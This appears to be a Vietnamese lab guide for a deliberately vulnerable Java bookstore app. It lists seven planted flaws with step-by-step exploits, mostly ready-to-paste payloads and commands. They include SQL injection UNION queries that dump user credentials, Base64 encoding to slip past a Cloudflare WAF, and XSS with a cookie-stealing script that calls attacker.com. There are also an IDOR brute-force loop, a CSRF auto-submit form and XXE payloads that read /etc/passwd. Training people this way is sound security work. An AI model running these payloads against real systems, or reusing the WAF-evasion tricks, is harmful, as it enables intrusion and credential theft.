# 🔓 Danh sách lỗ hổng bảo mật - JVA Bookstore

> **⚠️ CẢNH BÁO:** Các lỗ hổng này được tạo **CỐ Ý** cho mục đích thực hành Lab An toàn Web.
> Tuyệt đối **KHÔNG** triển khai lên môi trường production.

---

## Tổng quan

| # | Loại lỗ hổng | Mức độ | File bị ảnh hưởng | CWE |
|---|---|---|---|---|
| 1 | SQL Injection | 🔴 Nghiêm trọng | `BookDAO.java`, `BooksApiServlet.java` | CWE-89 |
| 2 | Stored XSS | 🔴 Nghiêm trọng | `ReviewDAO.java`, `book-detail.jsp`, `ReviewServlet.java` | CWE-79 |
| 3 | Reflected XSS | 🟠 Cao | `BooksApiServlet.java` | CWE-79 |
| 4 | IDOR | 🟠 Cao | `ProfileServlet.java` | CWE-639 |
| 5 | CSRF | 🟡 Trung bình | Toàn bộ API (không kiểm tra CSRF token) | CWE-352 |
| 6 | Hardcoded Secret | 🟡 Trung bình | `JwtFilter.java` | CWE-798 |
| 7 | XXE (XML External Entity) | 🔴 Nghiêm trọng | `XmlPingServlet.java` | CWE-611 |

---

## 🛡️ TÍNH NĂNG BYPASS WAF (DÀNH CHO CLOUDFLARE TUNNEL)
Nếu bạn host ứng dụng qua **Cloudflare Quick Tunnel** (trycloudflare.com), tường lửa WAF sẽ mặc định chặn các payload rõ ràng như `' OR '1'='1` hoặc `<script>`.
Để qua mặt WAF, ứng dụng đã được thiết kế một "backdoor": hỗ trợ nhận payload qua định dạng **Base64**.
- Thay vì truyền tham số `q`, hãy truyền tham số `b64q` chứa chuỗi Base64.
- Thay vì truyền JSON field `content`, hãy truyền `contentBase64`.
*(Chi tiết xem phần Khai thác của từng lỗ hổng bên dưới)*

---

## 1. 🔴 SQL Injection

### Mô tả
Endpoint tìm kiếm sách `/api/books/search` sử dụng `Statement.executeQuery()` với chuỗi SQL được nối trực tiếp từ input người dùng, **không dùng `PreparedStatement`**.

**Cấu trúc SQL gốc bên trong server:**
```sql
SELECT id, title, author, isbn, price, description, category, stock_quantity, image_url
FROM books
WHERE status = 'active' AND (title ILIKE '%<INPUT>%' OR author ILIKE '%<INPUT>%')
ORDER BY created_at DESC LIMIT 20
```

> **📌 Lưu ý quan trọng:** Giá trị `<INPUT>` được chèn giữa hai dấu `%`, tức là SQL thực tế sẽ là `ILIKE '%INPUT%'`. Do đó payload chỉ cần `x'` để đóng dấu nháy đơn, rồi `)` để đóng ngoặc `AND(`, và `-- ` để comment phần SQL còn lại (bao gồm cả nhánh `OR author ILIKE ...`).

### Hướng dẫn khai thác chi tiết (Step-by-step)

---

#### 🔹 Bước 1: Tìm kiếm bình thường (xác nhận endpoint hoạt động)
```
GET http://localhost:8081/api/books/search?q=test
```
→ Trả về bảng HTML hiển thị kết quả tìm kiếm sách chứa từ "test".

---

#### 🔹 Bước 2: OR-based Injection (Trả về TẤT CẢ sách)

**Payload gốc:**
```
x') OR 1=1 -- 
```

**Giải thích từng phần (dựa trên SQL gốc `ILIKE '%x') OR 1=1 -- %'...`):**
- `x'` → đóng dấu nháy đơn `'` của `ILIKE '%x`
- `)` → đóng ngoặc `(` của `AND (`
- `OR 1=1` → điều kiện luôn đúng → trả về tất cả
- `-- ` → comment bỏ phần SQL còn lại (`%' OR author ILIKE ...`)

**SQL sau injection:**
```sql
...AND (title ILIKE '%x') OR 1=1 -- %' OR author ILIKE '%x') OR 1=1 -- %') ORDER BY...
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                   Phần này bị comment bỏ bởi --
```

**URL (dùng trực tiếp trên trình duyệt):**
```
http://localhost:8081/api/books/search?q=x') OR 1=1 -- 
```

**Base64 Bypass WAF:**
- Payload gốc: `x') OR 1=1 -- `
- Base64: `eCcpIE9SIDE9MSAtLSA=`
- URL:
```
http://localhost:8081/api/books/search?b64q=eCcpIE9SIDE9MSAtLSA=
```

**Kết quả kỳ vọng:** Trả về **932 kết quả** (toàn bộ sách trong database).

---

#### 🔹 Bước 3: Error-based Injection (Xác nhận lỗ hổng)

**Gửi payload sai cú pháp để xem lỗi SQL chi tiết:**
```
http://localhost:8081/api/books/search?q=test'
```

**Kết quả:** Server trả về thông báo lỗi SQL chi tiết (Information Disclosure), ví dụ:
```
Lỗi truy vấn: ERROR: unterminated quoted string at or near ...
```

---

#### 🔹 Bước 4: ORDER BY Injection (Đếm số cột)

Dùng ORDER BY để xác định số cột của query gốc:
```
http://localhost:8081/api/books/search?q=x') ORDER BY 9 -- 
```
→ Thành công (query có 9 cột)

```
http://localhost:8081/api/books/search?q=x') ORDER BY 10 -- 
```
→ Lỗi (chỉ có 9 cột) → Xác nhận query có **9 cột**.

---

#### 🔹 Bước 5: UNION SELECT - Liệt kê tất cả bảng trong DB

**Payload gốc:**
```
x') AND 1=0 UNION SELECT 1,table_name,table_schema,'x',0.0,'x','x',0,'x' FROM information_schema.tables WHERE table_schema='public' -- 
```

**URL trình duyệt:**
```
http://localhost:8081/api/books/search?q=x') AND 1=0 UNION SELECT 1,table_name,table_schema,'x',0.0,'x','x',0,'x' FROM information_schema.tables WHERE table_schema='public' -- 
```

**Base64 Bypass WAF:**
- Base64: `eCcpIEFORCAxPTAgVU5JT04gU0VMRUNUIDEsdGFibGVfbmFtZSx0YWJsZV9zY2hlbWEsJ3gnLDAuMCwneCcsJ3gnLDAsJ3gnIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9J3B1YmxpYycgLS0g`
- URL:
```
http://localhost:8081/api/books/search?b64q=eCcpIEFORCAxPTAgVU5JT04gU0VMRUNUIDEsdGFibGVfbmFtZSx0YWJsZV9zY2hlbWEsJ3gnLDAuMCwneCcsJ3gnLDAsJ3gnIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9J3B1YmxpYycgLS0g
```

**Kết quả:** Trả về danh sách TẤT CẢ bảng trong database (users, orders, books, ...).

---

#### 🔹 Bước 6: UNION SELECT - Xem cấu trúc bảng users

**Payload gốc:**
```
x') AND 1=0 UNION SELECT 1,column_name,data_type,'x',0.0,'x','x',0,'x' FROM information_schema.columns WHERE table_name='users' -- 
```

**URL trình duyệt:**
```
http://localhost:8081/api/books/search?q=x') AND 1=0 UNION SELECT 1,column_name,data_type,'x',0.0,'x','x',0,'x' FROM information_schema.columns WHERE table_name='users' -- 
```

**Kết quả:** Trả về cấu trúc bảng `users` gồm các cột: id, username, email, password_hash, role, ...

---

#### 🔹 Bước 7: UNION SELECT - Trích xuất DỮ LIỆU USERS (username + email + password hash) ⚠️

**Payload gốc:**
```
x') AND 1=0 UNION SELECT 1,username,email,password_hash,0.0,role::text,'n/a',0,'n/a' FROM users -- 
```

**URL trình duyệt (copy-paste):**
```
http://localhost:8081/api/books/search?q=x') AND 1=0 UNION SELECT 1,username,email,password_hash,0.0,role::text,'n/a',0,'n/a' FROM users -- 
```

**Base64 Bypass WAF:**
- Base64: `eCcpIEFORCAxPTAgVU5JT04gU0VMRUNUIDEsdXNlcm5hbWUsZW1haWwscGFzc3dvcmRfaGFzaCwwLjAscm9sZTo6dGV4dCwnbi9hJywwLCduL2EnIEZST00gdXNlcnMgLS0g`
- URL:
```
http://localhost:8081/api/books/search?b64q=eCcpIEFORCAxPTAgVU5JT04gU0VMRUNUIDEsdXNlcm5hbWUsZW1haWwscGFzc3dvcmRfaGFzaCwwLjAscm9sZTo6dGV4dCwnbi9hJywwLCduL2EnIEZST00gdXNlcnMgLS0g
```

**Kết quả:** Trả về bảng HTML chứa TOÀN BỘ thông tin user trong DB:

| title (username) | author (email) | isbn (password_hash) | description (role) |
|---|---|---|---|
| admin01 | admin01@gmail.com | $2a$10$E5JF... | admin |
| seller7 | seller7@gmail.com | $2a$10$JCXF... | seller |
| ... | ... | ... | ... |

> **⚠️ Lưu ý:** Cột `title` hiển thị `username`, cột `author` hiển thị `email`, cột `isbn` hiển thị `password_hash`, cột `description` hiển thị `role` — vì UNION SELECT map theo thứ tự cột, không theo tên.

---

#### 🔹 Bước 8 (Nâng cao): Dùng cURL

```bash
# OR-based: Trả về tất cả sách
curl "http://localhost:8081/api/books/search?q=x%27)%20OR%201%3D1%20--%20"

# UNION: Lấy thông tin users
curl "http://localhost:8081/api/books/search?q=x%27)%20AND%201%3D0%20UNION%20SELECT%201%2Cusername%2Cemail%2Cpassword_hash%2C0.0%2Crole%3A%3Atext%2C%27n%2Fa%27%2C0%2C%27n%2Fa%27%20FROM%20users%20--%20"

# Base64 bypass: Lấy thông tin users
curl "http://localhost:8081/api/books/search?b64q=eCcpIEFORCAxPTAgVU5JT04gU0VMRUNUIDEsdXNlcm5hbWUsZW1haWwscGFzc3dvcmRfaGFzaCwwLjAscm9sZTo6dGV4dCwnbi9hJywwLCduL2EnIEZST00gdXNlcnMgLS0g"
```

---

## 2. 🔴 Stored XSS (Cross-Site Scripting lưu trữ)

### Mô tả
Hệ thống review sách cho phép **bất kỳ user đã đăng nhập** gửi đánh giá (không cần mua hàng). Nội dung review được lưu vào DB **không sanitize**, và khi hiển thị trên trang chi tiết sách (`book-detail.jsp`), nội dung được render trực tiếp qua `${r.comment}` (EL Expression) **không escape HTML**.

**File liên quan:**
- `ReviewDAO.java` (dòng 39-68): Lưu content vào DB không filter
- `ReviewServlet.java` (dòng 194-200): Hỗ trợ `contentBase64` decode trực tiếp
- `book-detail.jsp` (dòng 266): Render `${r.comment}` không dùng `<c:out>` hoặc `fn:escapeXml()`

### Hướng dẫn khai thác chi tiết (Step-by-step)

---

#### 🔹 Bước 1: Đăng nhập lấy JWT Token

> **⚠️ Lưu ý:** API login nhận `username` (tên đăng nhập), **KHÔNG phải email**.
> Bạn có thể dùng tài khoản admin mặc định: `admin01` / `123456`, hoặc đăng ký tài khoản mới.

**Đăng ký tài khoản test (nếu chưa có):**
```bash
curl -X POST http://localhost:8081/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testxss01","email":"testxss01@test.com","password":"123456"}'
```

**Đăng nhập lấy token:**
```bash
curl -X POST http://localhost:8081/api/login \
  -d "username=testxss01&password=123456"
```

**Kết quả trả về:**
```json
{"token":"eyJhbGciOiJIUzI1NiJ9...","message":"Login successful","role":"customer"}
```
→ Copy giá trị `token` để dùng ở bước sau.

---

#### 🔹 Bước 2: Gửi review chứa XSS payload

**Cách 1 — Gửi trực tiếp (Localhost, không qua WAF):**
```bash
curl -X POST http://localhost:8081/api/reviews \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"bookId":1,"rating":5,"content":"<script>alert(\"XSS Stored\")</script>"}'
```

**Cách 2 — Bypass WAF bằng Base64 (Cloudflare Tunnel):**
- Payload gốc: `<script>alert('XSS Stored')</script>`
- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTIFN0b3JlZCcpPC9zY3JpcHQ+`
```bash
curl -X POST http://localhost:8081/api/reviews \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"bookId":1,"rating":5,"contentBase64":"PHNjcmlwdD5hbGVydCgnWFNTIFN0b3JlZCcpPC9zY3JpcHQ+"}'
```

**Kết quả trả về:**
```json
{"success":true,"review":{"id":123,"userId":5,"bookId":1,"rating":5,"content":"<script>alert('XSS Stored')</script>","createdAt":"..."}}
```
→ Server đã lưu `<script>` vào database **không filter**!

---

#### 🔹 Bước 3: Trigger XSS — Mở trang chi tiết sách

Truy cập URL trên trình duyệt:
```
http://localhost:8081/books/detail?id=1
```

→ Khi trình duyệt render phần đánh giá, đoạn `<script>alert('XSS Stored')</script>` sẽ **thực thi tự động** và hiện hộp thoại alert.

> **📌 Tại sao XSS hoạt động?**
> File `book-detail.jsp` dòng 266 dùng `${r.comment}` — đây là EL Expression output trực tiếp, **KHÔNG** escape HTML.
> Nếu dùng `<c:out value="${r.comment}"/>` hoặc `${fn:escapeXml(r.comment)}` thì sẽ an toàn.

---

#### 🔹 Bước 4 (Nâng cao): Cookie Stealing payload

```bash
# Payload lấy cookie và gửi về server của attacker
curl -X POST http://localhost:8081/api/reviews \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"bookId":2,"rating":5,"content":"<script>new Image().src=\"https://attacker.com/steal?c=\"+document.cookie</script>"}'
```

→ Khi bất kỳ user nào xem sách id=2, cookie của họ sẽ bị gửi đến attacker.

---

## 3. 🟠 Reflected XSS

### Mô tả
Endpoint tìm kiếm trả về **HTML response** chứa keyword trực tiếp từ URL **không được escape**.

### Hướng dẫn khai thác (Bypass WAF bằng Base64)
- Payload gốc: `<script>alert('XSS Reflected')</script>`
- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTIFJlZmxlY3RlZCcpPC9zY3JpcHQ+`
- Request nạn nhân cần nhấp vào:
```
http://localhost:8081/api/books/search?b64q=PHNjcmlwdD5hbGVydCgnWFNTIFJlZmxlY3RlZCcpPC9zY3JpcHQ+
```

---

## 4. 🟠 IDOR (Insecure Direct Object Reference)

### Mô tả
**IDOR (Insecure Direct Object Reference)** là lỗ hổng xảy ra khi ứng dụng cho phép người dùng truy cập tài nguyên của người khác bằng cách **thay đổi giá trị tham số** (ví dụ: `userId=1` → `userId=2`) mà **không kiểm tra quyền sở hữu**.

Trong JVA Bookstore, endpoint **`GET /api/profile/user-info?userId=X`** cho phép bất kỳ user đã đăng nhập nào xem thông tin **TẤT CẢ user khác**, bao gồm cả:
- `username`, `email` (thông tin cá nhân)
- `password_hash` (mã băm mật khẩu — **cực kỳ nguy hiểm**)
- `role` (vai trò: admin/seller/customer)
- `status` (trạng thái tài khoản)

Lỗ hổng này **không bị Cloudflare WAF chặn** vì request hoàn toàn hợp lệ về mặt cú pháp.

**So sánh endpoint an toàn vs lỗ hổng:**

| Endpoint | An toàn? | Giải thích |
|---|---|---|
| `GET /api/profile` | ✅ An toàn | Trả về thông tin **của chính mình** (dựa vào JWT token) |
| `GET /api/profile/user-info?userId=X` | ❌ Lỗ hổng IDOR | Trả về thông tin **bất kỳ user nào** — chỉ cần biết `userId` |

**File liên quan:**
- `ProfileServlet.java` (dòng 1120-1177): Method `getAnyUserProfile()` — lấy `userId` từ parameter, truy vấn DB trực tiếp **không kiểm tra quyền**.

### Hướng dẫn khai thác chi tiết (Step-by-step)

---

#### 🔹 Bước 1: Đăng nhập lấy JWT Token (bằng tài khoản BẤT KỲ)

```bash
# Dùng tài khoản đã đăng ký hoặc tài khoản có sẵn
curl -X POST http://localhost:8081/api/login \
  -d "username=testxss01&password=123456"
```
→ Copy giá trị `token` từ response.

---

#### 🔹 Bước 2: Xem thông tin CỦA MÌNH (endpoint an toàn)

```bash
curl -H "Authorization: Bearer <TOKEN>" "http://localhost:8081/api/profile"
```

**Kết quả:** Trả về thông tin của chính bạn (email, fullName, phone) — **KHÔNG** có `password_hash`.

---

#### 🔹 Bước 3: Khai thác IDOR — Xem thông tin ADMIN

> **Lưu ý:** userId trong DB thường không bắt đầu từ 1. Bạn có thể dùng SQL Injection (mục 1, bước 7) để tìm các userId thực tế, hoặc brute force (bước 4).

```bash
# Ví dụ: admin01 có userId=232 trong DB demo
curl -H "Authorization: Bearer <TOKEN>" "http://localhost:8081/api/profile/user-info?userId=232"
```

**Kết quả kỳ vọng:**
```json
{
  "success": true,
  "user": {
    "id": 232,
    "username": "admin01",
    "email": "admin01@gmail.com",
    "passwordHash": "$2a$10$E5JF.8aU63NZIDWSN//bL.Mzlf7Sc4vw6oT.fXWoQDEK9BBJw7WHm",
    "role": "admin",
    "status": "active",
    "createdAt": "Oct 17, 2025, 5:07:04 PM"
  }
}
```
→ **Nguy hiểm:** Attacker có được `passwordHash` của admin → có thể thử crack offline bằng hashcat/john.

---

#### 🔹 Bước 4: Brute force — Duyệt qua nhiều userId

```bash
# Duyệt userId từ 190 đến 650 để tìm tất cả user (phạm vi ID tùy database)
for i in $(seq 190 650); do
  result=$(curl -s -H "Authorization: Bearer <TOKEN>" "http://localhost:8081/api/profile/user-info?userId=$i")
  echo "$result" | grep -q '"success":true' && echo "User ID $i: $result"
done
```

**Trên Windows (PowerShell):**
```powershell
$token = "<TOKEN>"
190..650 | ForEach-Object {
  try {
    $r = Invoke-RestMethod -Uri "http://localhost:8081/api/profile/user-info?userId=$_" -Headers @{Authorization="Bearer $token"}
    Write-Host "User ID $_ : $($r.user.username) | $($r.user.email) | role=$($r.user.role)"
  } catch {}
}
```

→ Kết quả: Lấy được **toàn bộ** username, email, password_hash, role của tất cả user trong hệ thống.

---

#### 🔹 Bước 5 (Nâng cao): Kết hợp với SQL Injection

Sau khi có `password_hash` từ IDOR, attacker có thể:
1. Crack hash offline → lấy mật khẩu gốc
2. Đăng nhập bằng tài khoản admin
3. Kết hợp với SQL Injection (Bước 7 ở mục 1) để so sánh kết quả

> **📌 Tại sao IDOR nguy hiểm?**
> - Không cần kỹ thuật cao — chỉ cần thay số `userId`
> - Không bị WAF phát hiện — request hoàn toàn bình thường
> - Lộ `password_hash` → dẫn đến Account Takeover
> - Có thể tự động hóa (brute force) để lấy toàn bộ user database

---

## 5. 🟡 CSRF (Cross-Site Request Forgery)

### Mô tả
Toàn bộ form và API **không có CSRF token**. Lỗ hổng này **không bị Cloudflare WAF chặn**.

### Khai thác (HTML tự submit)
```html
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://localhost:8081/api/profile/addresses" method="POST">
    <input type="hidden" name="recipientName" value="HACKER">
    <input type="hidden" name="phone" value="0000000000">
    <input type="hidden" name="line1" value="Hacked Address">
  </form>
</body>
```

---

## 6. 🟡 Hardcoded Secret

### Khai thác (KHÔNG bị Cloudflare WAF chặn)
Admin secret key hardcode `"dev-secret-key-change-me"`.
```bash
curl "http://localhost:8081/api/admin/orders?secret=dev-secret-key-change-me"
```

---

## 7. 🔴 XXE (XML External Entity)

### Mô tả
Một Endpoint API ẩn tên là `POST /api/xml-ping` dùng để test bằng XML đã bị bỏ quên. Nó sử dụng `DocumentBuilderFactory` mặc định, **không** filter DTD và External Entities. Do lỗ hổng này nhận dữ liệu qua POST (body), nó **có thể dễ dàng qua mặt Cloudflare WAF** tùy vào payload, HOẶC do Endpoint không phổ biến nên WAF không chặn chặt. Thiết kế lỗ hổng dưới dạng **In-Band XXE**, nội dung file trích xuất được sẽ trả về ngay trong kết quả `{"echo": "..."}`.

### Khai thác (KHÔNG cần đăng nhập)

Gửi một request POST chứa payload XXE tới `/api/xml-ping`.

**Windows (Đọc file win.ini):**
```bash
curl -X POST http://localhost:8081/api/xml-ping \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><ping>&xxe;</ping>'
```

**Linux (Đọc file /etc/passwd):**
```bash
curl -X POST http://localhost:8081/api/xml-ping \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><ping>&xxe;</ping>'
```

**Kết quả trả về sẽ có dạng:**
```json
{
  "success": true,
  "message": "Ping received",
  "echo": "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n"
}
```
